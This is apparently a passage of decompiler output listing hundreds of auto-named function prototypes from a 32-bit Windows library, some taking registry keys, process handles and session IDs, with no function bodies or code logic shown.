// BOOL __usercall sub_10028D85@<eax>(int a1@<eax>);
SIZE_T __thiscall sub_10028DCD(_DWORD *this, _DWORD *nSize);
char sub_10028E6C();
int __thiscall sub_10028E6F(void *this, _BYTE *a2);
BOOL __thiscall sub_10028EC7(_DWORD *this);
void *__thiscall sub_10028ED9(char *this, char a2);
int __thiscall sub_10028EE1(_DWORD *this);
char sub_10028EE9();
unsigned int __thiscall sub_10028EF1(_DWORD *this, unsigned int a2, int a3);
int __stdcall sub_10028EF9(int a1, int a2, int a3);
_BYTE *__thiscall sub_10028F97(_BYTE *Block, char a2);
int __stdcall sub_10028FB6(int a1, int a2, volatile LONG *lpAddend);
void __thiscall sub_10029024(_BYTE *this);
int __thiscall sub_1002907C(_DWORD **this, _BYTE *a2);
int __thiscall sub_1002909F(_DWORD **this, int a2);
int __thiscall sub_100290BA(_DWORD **this);
BOOL __thiscall sub_100290D6(void *this);
int __thiscall sub_100290E1(_BYTE *this);
int __thiscall sub_10029101(_DWORD **this);
int __thiscall sub_10029109(_DWORD **this, int a2, int a3);
char sub_10029133();
// _DWORD *__userpurge sub_10029136@<eax>(_DWORD *a1@<esi>, void *a2, char a3, BOOL a4, DWORD a5, int a6);
// bool __usercall sub_1002915F@<al>(int a1@<eax>);
// bool __usercall sub_100291B1@<al>(int a1@<eax>);
// bool __usercall sub_100291DD@<al>(int a1@<eax>);
// bool __usercall sub_10029209@<al>(int a1@<eax>);
// _DWORD *__usercall sub_10029218@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
char __thiscall sub_1002922C(void *this, int a2);
// _DWORD *__usercall sub_10029263@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
char __thiscall sub_10029277(HDC *this);
// _DWORD *__usercall sub_100292B6@<eax>(_DWORD *a1@<esi>);
char __stdcall sub_100292CE(int a1);
// _DWORD *__usercall sub_10029306@<eax>(_DWORD *a1@<esi>);
char __stdcall sub_1002931E(int a1);
// _DWORD *__usercall sub_10029356@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_1002936E@<al>(int a1@<eax>);
// _DWORD *__usercall sub_1002937D@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_10029395@<al>(int a1@<eax>);
void __cdecl sub_100293A5(HANDLE hSourceHandle, BOOL bInheritHandle, DWORD dwProcessId);
void __noreturn sub_10029482(void); // weak
void __noreturn sub_1002949F(void); // weak
void __noreturn sub_100294BC(void); // weak
_DWORD *__thiscall sub_10029587(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100295A6(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100295C5(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100295E4(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10029603(_DWORD *Block, char a2);
bool __thiscall sub_10029622(_DWORD *this);
// BOOL __usercall sub_10029653@<eax>(int a1@<eax>);
// char __userpurge sub_10029666@<al>(int a1@<eax>, int a2@<edi>, char a3);
bool __thiscall sub_100296A8(_DWORD *this);
// char __userpurge sub_100296D9@<al>(int a1@<eax>, int a2@<edi>, char a3);
bool __thiscall sub_1002971B(_DWORD *this);
// char __userpurge sub_1002974C@<al>(int a1@<eax>, int a2@<edi>, char a3);
char __thiscall sub_1002978E(_DWORD *this);
// char __usercall sub_100297BF@<al>(int a1@<eax>, int a2@<edi>);
// char __usercall sub_100297F4@<al>(int a1@<eax>, int a2@<edi>);
bool __thiscall sub_10029829(_DWORD *this);
// char __usercall sub_1002985A@<al>(int a1@<eax>, int a2@<edi>);
// bool __usercall sub_1002988F@<al>(int a1@<esi>);
// bool __usercall sub_100298A9@<al>(int a1@<esi>);
// bool __usercall sub_100298C3@<al>(int a1@<esi>);
// char __usercall sub_100298DD@<al>(int a1@<esi>);
// bool __usercall sub_100298F6@<al>(int a1@<esi>);
// BOOL __usercall sub_10029910@<eax>(int a1@<eax>);
// BOOL __usercall sub_10029923@<eax>(int a1@<eax>);
// BOOL __usercall sub_10029936@<eax>(int a1@<eax>);
// BOOL __usercall sub_10029949@<eax>(int a1@<eax>);
_DWORD *__stdcall sub_1002995C(_DWORD *a1);
_DWORD *__thiscall sub_100299E7(_DWORD *Block, char a2);
void __thiscall sub_10029A06(_DWORD *this);
// int __userpurge sub_10029A4D@<eax>(int a1@<esi>, int a2);
// _DWORD *__userpurge sub_10029A86@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10029AC5(void *this);
// _DWORD *__userpurge sub_10029AF6@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10029B35(void *this);
// void __usercall sub_10029B66(int a1@<esi>);
// void __usercall sub_10029B8E(int a1@<esi>);
_DWORD *__stdcall sub_10029BB6(_DWORD *a1);
_DWORD *__thiscall sub_10029BE4(_DWORD *Block, char a2);
void __thiscall sub_10029C03(_DWORD *this);
_DWORD *__stdcall sub_10029C27(_DWORD *a1);
_DWORD *__thiscall sub_10029C87(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10029CA6(_DWORD *this);
void __thiscall sub_10029CB1(_DWORD *this);
DWORD __cdecl sub_10029CE2(HANDLE a1, DWORD a2);
DWORD __cdecl sub_10029CF5(HANDLE *lpHandles, DWORD a2);
// int __usercall sub_10029D3F@<eax>(int a1@<eax>, int a2@<esi>);
// _DWORD *__userpurge sub_10029EA4@<eax>(int a1@<edi>, _DWORD *a2, DWORD a3, char pExceptionObject);
// _DWORD __stdcall sub_10029FF4(_DWORD, _DWORD, _DWORD pExceptionObject); weak
void __thiscall sub_1002A06A(_DWORD *this);
void __thiscall sub_1002A08E(_DWORD *this);
_DWORD *__thiscall sub_1002A0B2(_DWORD *Block, char a2);
void __thiscall sub_1002A0D1(_DWORD *this);
_DWORD *__thiscall sub_1002A0F5(_DWORD *Block, char a2);
void __thiscall sub_1002A114(_DWORD *this);
_DWORD *__thiscall sub_1002A138(_DWORD *Block, char a2);
void __thiscall sub_1002A157(_DWORD *this);
// _DWORD *__usercall sub_1002A17B@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_1002A197(_DWORD *Block, char a2);
BOOL __thiscall sub_1002A1ED(_DWORD *this);
void __noreturn sub_1002A23C(void); // weak
int sub_1002A28C();
void __noreturn sub_1002A2B8(void); // weak
_DWORD *__stdcall sub_1002A2DB(_DWORD *a1);
void __thiscall sub_1002A309(_DWORD *this);
_DWORD *__stdcall sub_1002A32D(_DWORD *a1);
void __thiscall sub_1002A35B(_DWORD *this);
_DWORD *__thiscall sub_1002A386(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1002A3AD(_DWORD *a1, int a2, int a3);
void *__thiscall sub_1002A3F3(void *Block, char a2);
void __thiscall sub_1002A412(int this);
int __thiscall sub_1002A46A(void *this, _BYTE *a2);
int __thiscall sub_1002A496(_DWORD **this, int a2);
int __thiscall sub_1002A52E(_DWORD **this, int a2, int a3);
int __thiscall sub_1002A568(_DWORD **this);
_DWORD *__stdcall sub_1002A570(_DWORD *a1, int a2, int a3);
void *__thiscall sub_1002A5C9(void *Block, char a2);
int __thiscall sub_1002A5E8(int this);
int __thiscall sub_1002A64C(char *this, char a2);
unsigned int __thiscall sub_1002A672(int *this, int *a2);
int __thiscall sub_1002A70F(_DWORD **this, int a2, int a3);
int __thiscall sub_1002A749(_DWORD **this);
void __thiscall sub_1002A751(_DWORD *this);
void __thiscall sub_1002A776(_DWORD *this, int a2, volatile LONG *lpAddend);
LONG __thiscall sub_1002A992(int *this);
int *__thiscall sub_1002A9B9(int *Block, char a2);
int *__stdcall sub_1002A9D8(int *a1, int a2, int a3, volatile LONG *lpAddend, int a5);
void *__thiscall sub_1002AAAE(void *Block, char a2);
LONG __stdcall sub_1002AACE(int a1);
_DWORD *__stdcall sub_1002AAFD(_DWORD *a1, int a2, int a3, int a4, void *Block, int a6);
LONG __fastcall sub_1002AC32(int a1, _DWORD *a2);
LONG __thiscall sub_1002AD03(_DWORD *this, int a2);
int __thiscall sub_1002AD94(int this);
int sub_1002ADF0();
// void __usercall sub_1002AE03(int a1@<edi>, int a2@<esi>);
int *__cdecl sub_1002AE46(int *a1, void *a2);
_DWORD *__cdecl sub_1002B023(_DWORD *a1, int *a2);
_DWORD *__stdcall sub_1002B11F(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend);
_DWORD *__stdcall sub_1002B1C2(int a1, _DWORD *a2);
LONG __thiscall sub_1002B1FF(_DWORD *this, int a2);
int *__thiscall sub_1002B2CC(_DWORD *this, int *a2, int a3, int a4, int *a5);
// LONG __userpurge sub_1002B3C0@<eax>(int a1@<esi>, int a2, int a3);
// _DWORD *__usercall sub_1002B444@<eax>(_DWORD *a1@<esi>);
// _DWORD *__userpurge sub_1002B4BC@<eax>(_DWORD *a1@<esi>, int a2);
// void __usercall sub_1002B4FB(_DWORD *a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_1002B55A(_DWORD *a1, int a2, int a3, int a4);
int *__thiscall sub_1002B5B8(int *Block, char a2);
LONG __stdcall sub_1002B5D8(int *a1);
_DWORD *__stdcall sub_1002B606(_DWORD *a1, _DWORD *a2, int a3, int a4);
_DWORD *__stdcall sub_1002B697(_DWORD *a1, _DWORD *a2, int a3, int a4);
_DWORD *__thiscall sub_1002B729(_DWORD *this, _DWORD *a2, int a3, int a4, int a5);
bool __stdcall sub_1002B8C4(_DWORD *a1, int a2, int a3, int a4);
int __thiscall sub_1002B934(_DWORD *this, int a2);
LONG __thiscall sub_1002B965(_DWORD *this, int a2, int *a3, int a4);
int __thiscall sub_1002BBDD(_DWORD *this);
int __thiscall sub_1002BC6C(_DWORD *this, int pExceptionObject, int a3);
int sub_1002BDB5();
int __thiscall sub_1002BDB9(int this, int a2);
int __thiscall sub_1002BDEA(int this, int a2);
_DWORD *__thiscall sub_1002BE1B(void *this, _DWORD *a2);
void __thiscall sub_1002BE6B(_DWORD *this);
BOOL __thiscall sub_1002BE90(void *this);
_DWORD *__thiscall sub_1002BEA9(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002BEFC(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002BF4F(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002BFAA(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002C005(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1002C07A(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_1002C0EF(_DWORD *this);
int *__thiscall sub_1002C114(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1002C17C(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1002C1E4(void *this, int a2);
void __thiscall sub_1002C21C(void *this, int a2, int a3);
void __thiscall sub_1002C257(void *this, int a2);
int __thiscall sub_1002C28F(void *this, int a2);
int __thiscall sub_1002C2CB(void *this, int a2);
void __thiscall sub_1002C307(void *this);
_DWORD *__thiscall sub_1002C34F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002C36E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002C38E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002C3AE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002C3CD(_DWORD *Block, char a2);
// int __usercall sub_1002C3F2@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_1002C423(void *this, int a2);
// int __usercall sub_1002C456@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__stdcall sub_1002C495(_DWORD *a1, int a2);
BOOL __thiscall sub_1002C4D9(int this);
BOOL __thiscall sub_1002C4EC(_DWORD *this);
int *__thiscall sub_1002C4F6(int *this);
void __thiscall sub_1002C531(_DWORD *this);
void __thiscall sub_1002C535(_DWORD *this);
void __noreturn sub_1002C539(); // weak
void __noreturn sub_1002C556(); // weak
LONG __thiscall sub_1002C573(int *this);
_DWORD *__thiscall sub_1002C5A8(void *this, _DWORD *a2, int a3);
void __thiscall sub_1002C5DC(_DWORD *this);
bool __thiscall sub_1002C601(int this);
BOOL __thiscall sub_1002C618(_DWORD *this);
int __thiscall sub_1002C622(int this);
int __thiscall sub_1002C65D(int this);
int __thiscall sub_1002C693(_DWORD *this);
int __thiscall sub_1002C6BB(int this);
int __thiscall sub_1002C6F6(int this, int a2);
_DWORD *__thiscall sub_1002C712(void *this, _DWORD *a2, int a3);
void __thiscall sub_1002C746(_DWORD *this);
bool __thiscall sub_1002C76B(int this);
BOOL __thiscall sub_1002C782(_DWORD *this);
int __thiscall sub_1002C78C(int this);
int __thiscall sub_1002C7C7(int this);
int __thiscall sub_1002C7FD(_DWORD *this);
int __thiscall sub_1002C825(int this);
int __thiscall sub_1002C860(int this, int a2);
_DWORD *__thiscall sub_1002C87C(_DWORD *Block, char a2);
int *__thiscall sub_1002C89C(int *Block, char a2);
_DWORD *__thiscall sub_1002C8BB(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002C8DA(_DWORD *Block, char a2);
LONG __stdcall sub_1002C8F9(_DWORD *a1);
_DWORD *__stdcall sub_1002C94A(_DWORD *a1);
// _DWORD *__usercall sub_1002C9BB@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
int *__thiscall sub_1002C9EB(int *this, int *a2);
void __thiscall sub_1002CA30(_DWORD *this);
int __thiscall sub_1002CA82(_DWORD *this);
_DWORD *__thiscall sub_1002CA86(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1002CAEC(int *this, int a2);
int __thiscall sub_1002CB07(_DWORD *this, unsigned int a2);
int __thiscall sub_1002CB61(_DWORD *this, int a2);
int __thiscall sub_1002CB82(_DWORD *this, int a2);
char *__thiscall sub_1002CBA3(_DWORD *this, char *a2);
int __thiscall sub_1002CBCC(int *this);
BOOL __thiscall sub_1002CBF3(void *this);
int __thiscall sub_1002CBFE(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1002CC43(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1002CCB5(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1002CCDD(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1002CCF0(_DWORD *this, int a2, int a3, void *Block);
void __thiscall sub_1002CD96(_DWORD *this);
_DWORD *__stdcall sub_1002CE9F(_DWORD *a1);
void __thiscall sub_1002CEE4(_DWORD *this);
bool __thiscall sub_1002CF2F(_DWORD *this, int a2);
char __thiscall sub_1002CF6E(_DWORD *this, int a2);
int __thiscall sub_1002CFC2(_DWORD *this, int a2);
int __thiscall sub_1002D03A(_DWORD *this, int pExceptionObject);
_DWORD *__thiscall sub_1002D094(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1002D0C5(_DWORD *this, _DWORD *a2);
int __thiscall sub_1002D0F6(_DWORD *this, int a2);
int __thiscall sub_1002D111(_DWORD *this);
int __thiscall sub_1002D125(_DWORD *this);
_DWORD *__thiscall sub_1002D12D(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1002D166(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1002D19F(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1002D1D8(int *this, _DWORD *a2);
// _DWORD *__userpurge sub_1002D225@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002D264(void *this);
// _DWORD *__userpurge sub_1002D295@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002D2D4(void *this);
// _DWORD *__userpurge sub_1002D313@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002D352(void *this);
_DWORD *__thiscall sub_1002D383(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002D3A2(_DWORD *this);
_DWORD *__thiscall sub_1002D3AC(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1002D3CB(_DWORD *a1);
// _DWORD *__userpurge sub_1002D426@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1002D474(_DWORD *a1);
// int __userpurge sub_1002D4B3@<eax>(_DWORD *a1@<edi>, int a2);
// void __usercall sub_1002D55B(int a1@<esi>);
// void __usercall sub_1002D583(int a1@<esi>);
// void __usercall sub_1002D5BD(int a1@<esi>);
_DWORD *__stdcall sub_1002D5E5(_DWORD *a1);
// void __usercall sub_1002D61A(_DWORD *a1@<edi>, unsigned int a2@<esi>);
_DWORD *__stdcall sub_1002D694(_DWORD *a1, int a2, int a3);
// _DWORD *__userpurge sub_1002D6D1@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3);
void __fastcall sub_1002D72A(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1002D863(_DWORD *a1);
void __thiscall sub_1002D8B3(_DWORD *this);
_DWORD *__thiscall sub_1002D8C5(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1002D934(_DWORD *this, char a2);
int __stdcall sub_1002D961(int a1);
// int __usercall sub_1002D981@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
int __thiscall sub_1002DA3A(void *this, int a2);
int __stdcall sub_1002DAD5(int a1, int a2, int a3, int a4);
// LONG __userpurge sub_1002DBA8@<eax>(int *a1@<edi>, int a2);
_DWORD *__thiscall sub_1002DC25(void *this, _DWORD *a2, unsigned int a3);
int *__stdcall sub_1002DC63(int *a1, int a2, int a3, int a4, int a5);
int __stdcall sub_1002DD20(int a1, int a2);
int *__thiscall sub_1002DDBD(int *Block, char a2);
BOOL __thiscall sub_1002DDDC(int *this);
void __thiscall sub_1002DE5C(void *this);
void __stdcall sub_1002DEAE(int a1);
// int __userpurge sub_1002DED2@<eax>(unsigned int a1@<ecx>, int a2@<ebx>, unsigned int a3);
void __stdcall sub_1002DFA4(int a1);
_DWORD *__stdcall sub_1002DFC8(int a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
_DWORD *__thiscall sub_1002E062(int this, _DWORD *a2, unsigned int a3);
// void __userpurge sub_1002E117(int a1@<ecx>, int a2@<ebx>, int a3@<esi>, int a4, int a5, int a6, int *a7);
void __fastcall sub_1002E18C(int a1, unsigned int a2, void *a3);
unsigned int __fastcall sub_1002E293(unsigned int a1, _DWORD **a2);
_DWORD *__stdcall sub_1002E3FC(_DWORD *a1);
void __thiscall sub_1002E44C(_DWORD *this);
_DWORD *__thiscall sub_1002E45E(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1002E4CD(_DWORD *this, char a2);
int __stdcall sub_1002E4FA(int a1);
void __stdcall sub_1002E51A(int a1, _DWORD *a2, int a3);
// void __userpurge sub_1002E554(int *a1@<ebx>, _DWORD *a2, volatile LONG *lpAddend);
int __stdcall sub_1002E609(int *a1, unsigned int a2);
void __stdcall sub_1002E679(int *a1, _DWORD *a2, volatile LONG *lpAddend);
int __thiscall sub_1002E6FE(int this);
int __thiscall sub_1002E757(int this);
int __stdcall sub_1002E7A0(int a1, int a2);
_DWORD *__stdcall sub_1002E7DC(int a1, _DWORD *a2, int a3, int a4);
_DWORD *__stdcall sub_1002E885(_DWORD *a1, struct _SECURITY_ATTRIBUTES *a2, int a3, int a4);
_DWORD *__thiscall sub_1002E8DB(_DWORD *Block, char a2);
bool __thiscall sub_1002E8FA(_DWORD *this);
int __thiscall sub_1002E930(void *this, int a2, int a3);
int __thiscall sub_1002E97D(void *this, int a2, int a3);
_DWORD *__stdcall sub_1002E9C3(_DWORD *a1);
_DWORD *__thiscall sub_1002E9F1(_DWORD *Block, char a2);
void __thiscall sub_1002EA10(_DWORD *this);
_DWORD *__stdcall sub_1002EA34(_DWORD *a1, int a2);
int __stdcall sub_1002EA6C(int a1);
void __thiscall sub_1002EACA(_DWORD *this);
_DWORD *__stdcall sub_1002EAEE(_DWORD *a1);
_DWORD *__thiscall sub_1002EB1C(_DWORD *Block, char a2);
void __thiscall sub_1002EB3B(_DWORD *this);
_DWORD *__stdcall sub_1002EB5F(_DWORD *a1);
void __thiscall sub_1002EB8D(_DWORD *this);
_DWORD *__stdcall sub_1002EBB1(_DWORD *a1);
void __thiscall sub_1002EBDF(_DWORD *this);
// int __usercall sub_1002EC03@<eax>(int result@<eax>);
int __cdecl sub_1002EC10(int a1, int a2);
// DWORD __usercall sub_1002EC4A@<eax>(int a1@<edi>, _DWORD *a2, _DWORD *a3);
char __cdecl sub_1002ED93(int a1, int a2, int a3);
_DWORD *__stdcall sub_1002EEB0(_DWORD *a1, DWORD dwMaximumSizeLow, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, int a4, int a5);
_DWORD *__thiscall sub_1002EFF3(_DWORD *Block, char a2);
bool __thiscall sub_1002F012(_DWORD *this);
_DWORD *__thiscall sub_1002F05E(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1002F085@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
int __thiscall sub_1002F0B5(_DWORD *this, int a2);
bool sub_1002F0F1();
int __fastcall sub_1002F115(int a1, _DWORD *a2);
void __stdcall sub_1002F1A6(int a1);
int __fastcall sub_1002F1D4(int a1, int *a2);
_DWORD *__stdcall sub_1002F278(_DWORD *a1);
void __thiscall sub_1002F2A6(_DWORD *this);
int __stdcall sub_1002F2CA(int a1, int a2, char a3);
_BYTE *__thiscall sub_1002F303(_BYTE *Block, char a2);
void __thiscall sub_1002F322(_BYTE *this);
int __thiscall sub_1002F364(void *this);
int __thiscall sub_1002F370(_BYTE *this);
int __thiscall sub_1002F396(void *this);
int __thiscall sub_1002F3A6(void *this);
int __thiscall sub_1002F3B6(void *this);
int __thiscall sub_1002F3C2(_DWORD *this);
BOOL __thiscall sub_1002F3C6(void *this);
int __thiscall sub_1002F3ED(void *this);
int __thiscall sub_1002F426(void *this, int a2, int a3);
int __stdcall sub_1002F467(int a1);
_BYTE *__thiscall sub_1002F496(_BYTE *Block, char a2);
void __thiscall sub_1002F4B5(_BYTE *this);
void __thiscall sub_1002F4F9(_BYTE *this);
int __thiscall sub_1002F4FE(int *this, _DWORD *a2);
void __thiscall sub_1002F565(void *this, int *a2);
char __thiscall sub_1002F5D5(_BYTE *this);
_DWORD *__thiscall sub_1002F5E7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002F607(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002F635(_DWORD *Block, char a2);
void __thiscall sub_1002F654(_DWORD *this);
char __thiscall sub_1002F679(void *this, HKEY a2);
_DWORD *__thiscall sub_1002F83C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002F85B(_DWORD *Block, char a2);
HKEY __stdcall sub_1002F87A(int a1, HKEY a2);
// HKEY __usercall sub_1002F9D8@<eax>(HKEY result@<eax>, int a2@<ecx>);
LONG __thiscall sub_1002FA3E(void *this, HKEY a2);
char __stdcall sub_1002FBAB(HKEY a1);
void __thiscall sub_1002FC8B(void *this, _DWORD *a2, HKEY a3, DWORD dwIndex);
DWORD __thiscall sub_1002FDC0(void *this, HKEY a2);
char __thiscall sub_1002FE91(void *this, HKEY a2, int a3);
_DWORD *__thiscall sub_1002FF72(void *this, _DWORD *a2, HKEY a3, int pExceptionObject, DWORD *a5);
char __thiscall sub_10030079(void *this, HKEY a2, int a3, _DWORD *a4, DWORD dwType);
char __thiscall sub_10030137(void *this, HKEY a2, int a3);
void __thiscall sub_1003021A(void *this, _DWORD *a2, HKEY a3, DWORD dwIndex);
DWORD __thiscall sub_10030315(void *this, HKEY a2);
unsigned int __stdcall sub_100303E1(HKEY phkResult);
_DWORD *__stdcall sub_10030561(_DWORD *a1, int a2);
_DWORD *__stdcall sub_100306CD(_DWORD *a1, int pExceptionObject);
int *__thiscall sub_1003073D(int *Block, char a2);
_DWORD *__stdcall sub_1003075C(_DWORD *a1, int a2);
LONG __thiscall sub_1003078F(int *this);
// BOOL __usercall sub_100307B6@<eax>(int a1@<eax>, int a2@<ecx>);
int __thiscall sub_100307D2(void *this);
_DWORD *__stdcall sub_1003098B(int a1, _DWORD *a2, int a3);
_DWORD *__stdcall sub_10030A04(int a1, _DWORD *a2, int a3);
char __stdcall sub_10030A7E(int a1, int a2);
_DWORD *__stdcall sub_10030ACF(int a1, _DWORD *a2, int a3);
_DWORD *__stdcall sub_10030B03(int a1, _DWORD *a2, int pExceptionObject, int a4);
_DWORD *__stdcall sub_10030C6C(int a1, _DWORD *a2);
_DWORD *__thiscall sub_10030CA1(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_10030D2F(_DWORD *a1, void *Block, int a3);
int *__thiscall sub_10030D92(int *Block, char a2);
// _DWORD *__userpurge sub_10030DB1@<eax>(int a1@<edi>, _DWORD *a2);
// int *__userpurge sub_10030E12@<eax>(int *a1@<esi>, int *Block);
LONG __thiscall sub_10030E7D(int *this);
int __thiscall sub_10030ED2(_DWORD *this, int a2);
// _DWORD *__userpurge sub_10030F1B@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
// bool __usercall sub_10030F62@<al>(int a1@<eax>, int a2@<ecx>);
_DWORD *__stdcall sub_10030F8A(_DWORD *a1, int a2, void *Block);
int *__thiscall sub_10030FEF(int *Block, char a2);
// _DWORD *__userpurge sub_1003100E@<eax>(int a1@<edi>, _DWORD *a2);
// int *__userpurge sub_10031072@<eax>(int *a1@<esi>, int *Block);
LONG __thiscall sub_100310DD(int *this);
int __thiscall sub_10031132(_DWORD *this, int a2);
// _DWORD *__userpurge sub_1003117B@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
// BOOL __usercall sub_100311C2@<eax>(int a1@<eax>, int a2@<ecx>);
_DWORD *__stdcall sub_100311E9(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10031224(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10031276(int a1, _DWORD *a2);
_DWORD *__stdcall sub_100312B1(int a1, _DWORD *a2);
// int __usercall sub_1003130C@<eax>(_BYTE *a1@<eax>, _DWORD *a2@<ecx>, unsigned int a3);
// int __usercall sub_1003162D@<eax>(int a1@<eax>);
// int __usercall sub_1003170C@<eax>(int result@<eax>, __int16 a2@<dx>);
// int __usercall sub_1003172E@<eax>(int a1@<eax>);
// int __usercall sub_1003177B@<eax>(int a1@<edi>, int a2);
// int __usercall sub_10031EB8@<eax>(int a1@<esi>);
// unsigned int __usercall sub_100320CD@<eax>(unsigned __int8 **a1@<esi>, void *a2, unsigned int a3);
// int __usercall sub_10032137@<eax>(int a1@<esi>);
unsigned int __cdecl sub_100321B5(unsigned int a1);
// int __usercall sub_100322FA@<eax>(_DWORD *a1@<eax>, int a2@<edi>);
// unsigned int __usercall sub_10032384@<eax>(int a1@<edi>);
int __cdecl sub_10032468(int *a1, int a2);
int __cdecl sub_10032596(int a1, int a2);
int __cdecl sub_1003288E(_DWORD *a1, int a2);
void __cdecl __noreturn sub_10032C53(int a1);
_DWORD *__thiscall sub_10032C73(_DWORD *Block, char a2);
void __thiscall sub_10032C92(_DWORD *this);
int __stdcall sub_10032CC2(int a1, int a2);
void *__thiscall sub_10032D22(void *Block, char a2);
LONG __thiscall sub_10032D41(int this);
void __thiscall sub_10032D96(int this, _DWORD *a2);
void __thiscall sub_10033309(_DWORD *this);
_DWORD *__thiscall sub_1003331C(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_100333B8(_DWORD *this, int a2, int a3);
char *__thiscall sub_10033421(_DWORD *this, char a2);
_DWORD *__thiscall sub_10033443(_DWORD *this, char a2);
// _DWORD *__userpurge sub_1003348C@<eax>(_DWORD *a1@<esi>, int a2);
void __noreturn sub_100334CB(void); // weak
_DWORD *__thiscall sub_100334EA(_DWORD *Block, char a2);
BOOL __thiscall sub_10033509(_DWORD *this);
// int __userpurge sub_10033555@<eax>(int a1@<edi>, int a2, char a3, char a4, char a5);
int *__thiscall sub_100335B2(int *Block, char a2);
LONG __thiscall sub_100335D1(int *this);
// int __userpurge sub_10033610@<eax>(int a1@<esi>, int a2);
void __stdcall sub_10033669(int a1);
_DWORD *__stdcall sub_10033707(_DWORD *a1, int a2);
_BYTE *__thiscall sub_10033739(_BYTE *Block, char a2);
void __thiscall sub_10033758(_BYTE *this);
void __thiscall sub_1003377C(void *this, int a2, unsigned int a3);
__int16 __thiscall sub_100337C1(void *this);
int __thiscall sub_100337D6(void *this);
_DWORD *__thiscall sub_100337EA(void *this, _DWORD *a2);
char sub_10033871();
int sub_10033885();
char sub_10033888();
int __thiscall sub_1003388C(_DWORD *this);
bool __thiscall sub_10033890(_DWORD *this);
_DWORD *__thiscall sub_100338C3(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_100338E2@<eax>(int a1@<ebx>, _DWORD *a2);
int __stdcall sub_1003394B(int a1, int a2);
char __thiscall sub_10033A1B(_BYTE *this);
DWORD __thiscall sub_10033A1F(int this);
int __thiscall sub_10033A9F(int this);
_DWORD *__stdcall sub_10033AC4(int pExceptionObject, _DWORD *a2, DWORD a3);
// int __usercall sub_10033B19@<eax>(int a1@<eax>, int a2@<esi>);
HLOCAL *__thiscall sub_10033B31(HLOCAL *Block, char a2);
// HLOCAL *__usercall sub_10033B5E@<eax>(HLOCAL *result@<eax>);
HLOCAL *__thiscall sub_10033B6E(HLOCAL *this);
_DWORD *__stdcall sub_10033B9F(int a1, _DWORD *a2);
// BOOL __usercall sub_10033CE7@<eax>(int a1@<eax>, int a2@<ecx>);
int __stdcall sub_10033D1B(int a1, DWORD pSessionId);
int *__thiscall sub_10033E4A(int *Block, char a2);
LONG __stdcall sub_10033E69(int *a1);
// int __usercall sub_10033E89@<eax>(int *a1@<eax>, int a2@<ecx>);
int __thiscall sub_10033EA5(_DWORD *this, int a2);
int __thiscall sub_10033F40(_DWORD *this, int a2);
LONG __thiscall sub_10033F75(int *this);
void __thiscall sub_10033FDC(_ThrowInfo *this);
char __thiscall sub_10033FF2(_BYTE *this);
unsigned int __thiscall sub_10033FF6(unsigned int *this);
int __thiscall sub_100341B7(_DWORD *this);
